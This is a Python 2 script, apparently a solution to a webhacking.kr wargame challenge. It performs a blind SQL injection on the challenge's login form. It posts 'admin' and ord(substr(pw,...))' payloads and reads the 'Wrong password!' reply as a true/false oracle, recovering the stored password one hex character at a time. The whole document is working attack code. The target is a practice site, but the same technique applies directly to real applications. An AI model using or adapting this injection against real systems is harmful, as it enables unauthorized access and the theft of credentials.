import httplib, urllib, re

pw = ""
md5 = range(48,58)
md5 = md5+range(97,104)
print md5
for i in range(1,40):
    for j in md5:
        data = {"id" : "admin' and ord(substr(pw,"+str(i)+",1))="+str(j)+"#"}
        data = urllib.urlencode(data)
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Cookie": "PHPSESSID=Cookie Value"}
        conn = httplib.HTTPConnection("webhacking.kr")
        conn.request("POST", "/challenge/bonus/bonus-2/index.php", data, headers)
        response = conn.getresponse()
        aa = response.read()
        find = re.findall("Wrong password!",aa)
        print "%d , %s" % (i, chr(j))
        if find:
            pw+=chr(j)
            print "find pw: %s" % pw
            break;
        if j==103:
            print "Password: %s" % pw
            conn.close()
            exit()
